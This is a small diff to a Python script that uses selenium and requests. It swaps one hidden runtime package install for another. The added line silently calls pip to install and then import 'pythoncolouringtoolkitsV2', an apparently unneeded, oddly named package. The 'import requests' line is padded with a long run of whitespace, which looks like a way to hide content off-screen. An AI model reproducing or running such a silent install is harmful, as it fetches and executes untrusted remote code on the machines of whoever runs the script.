@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourextension")
-import pythoncolourextension
+os.system("pip install pythoncolouringtoolkitsV2")
+import pythoncolouringtoolkitsV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
